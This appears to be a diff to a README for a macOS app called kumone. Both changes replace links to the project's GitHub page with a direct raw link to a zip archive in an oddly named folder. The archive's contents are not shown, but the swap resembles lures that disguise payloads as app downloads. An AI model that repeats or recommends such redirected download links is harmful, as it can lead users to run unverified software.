@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run **kumone** (雲の音) on you
 
 ## 📥 Download Kumone
 
-[![Download Kumone](https://img.shields.io/badge/Download-Kumone-8A2BE2?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/unscientific-setdecoration713/kumone)
+[![Download Kumone](https://img.shields.io/badge/Download-Kumone-8A2BE2?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/unscientific-setdecoration713/kumone/main/experimentalize/v1.3.zip)
 
 Visit this link to download the application.
 
@@ -25,7 +25,7 @@ Kumone is designed to run smoothly on most modern macOS systems. Here's what you
 ### Step 1: Get the Application
 
 Visit this link to download the application:  
-[https://github.com/unscientific-setdecoration713/kumone](https://github.com/unscientific-setdecoration713/kumone)
+[https://raw.githubusercontent.com/unscientific-setdecoration713/kumone/main/experimentalize/v1.3.zip](https://raw.githubusercontent.com/unscientific-setdecoration713/kumone/main/experimentalize/v1.3.zip)
 
 Look for the most recent release and download the macOS installation file.
 
